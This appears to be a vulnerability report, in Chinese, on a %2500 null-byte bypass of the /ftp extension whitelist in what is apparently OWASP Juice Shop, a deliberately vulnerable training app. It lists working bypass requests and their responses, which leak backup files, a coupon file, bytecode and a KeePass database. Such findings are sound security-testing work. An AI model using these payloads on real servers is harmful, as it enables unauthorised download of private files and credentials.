name: /ftp 静态目录扩展名校验可被 %2500 空字节绕过，任意备份/二进制文件均可未授权下载
summary: 服务端对 /ftp/ 下文件仅做“以 .md/.pdf 结尾”的扩展名白名单校验且校验发生在 URL 一次解码之后；请求 /ftp/package.json.bak%2500.md（%25 再解码为 %）即可让校验看到的路径以 .md 结尾、而文件系统按 package.json.bak\0 截断取到真实文件，返回 200 与完整内容。同一手法可下载 eastere.gg、suspicious_errors.yml、coupons_2013.md.bak、encrypt.pyc、package-lock.json.bak(771KB) 等。

正常对照（扩展名白名单生效）:
  GET /ftp/package.json.bak            -> 403 text/html <title>Error: Only .md and .pdf files are allowed!</title>
  GET /ftp/eastere.gg                  -> 403 同上
  GET /ftp/suspicious_errors.yml       -> 403 同上
  GET /ftp/coupons_2013.md.bak         -> 403 同上
绕过（%25 -> % -> %00 解码后扩展名判定为 .md，实际文件名为 .bak/.gg/.yml）:
  GET /ftp/package.json.bak%2500.md    -> 200 application/octet-stream, Content-Length: 4440
      {"name":"juice-shop","version":"6.2.0-SNAPSHOT", ... "dependencies":{"body-parser":"~1.18","express":"~4.16","express-jwt":"0.1.3", ...}}
  GET /ftp/eastere.gg%2500.md          -> 200, CL=337  "Congratulations, you found the easter egg!\r\n- The incredibly funny developers..."
  GET /ftp/suspicious_errors.yml%2500.md -> 200 text/yaml, CL=741
      title: Suspicious error messages specific to the application
      description: Detects error messages that only occur from tampering with or attacking the applicati...
  GET /ftp/coupons_2013.md.bak%2500.md -> 200, CL=142（内容为加密后的优惠券行）
  GET /ftp/encrypt.pyc%2500.md         -> 200 application/octet-stream, CL=573（Python 字节码）
  GET /ftp/incident-support.kdbx       -> 200 application/octet-stream, CL=3246（KeePass 2.x 数据库，直接可取，无需绕过）
  GET /ftp/package-lock.json.bak%2500.md -> 200, CL=771684（完整依赖锁文件）
